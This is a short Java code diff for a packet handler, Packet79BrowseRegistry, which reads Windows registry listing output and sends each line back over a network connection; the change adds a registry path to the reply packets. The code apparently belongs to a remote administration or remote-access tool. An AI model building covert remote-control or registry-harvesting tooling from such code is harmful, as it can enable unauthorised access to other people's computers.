@@ -24,14 +24,14 @@ public class Packet79BrowseRegistry extends AbstractIncomingPacket {
 
 				while ((line = reader.readLine()) != null) {
 					String[] args = line.trim().split("    ");
-					Connection.addToSendQueue(new Packet54Registry(args));
+					Connection.addToSendQueue(new Packet54Registry(path, args));
 				}
 				reader.close();
 			} else {
 				throw new Exception("Windows only");
 			}
 		} catch (Exception ex) {
-			Connection.addToSendQueue(new Packet54Registry(new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
+			Connection.addToSendQueue(new Packet54Registry("", new String[] { "1", "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage() }));
 		}
 	}
 
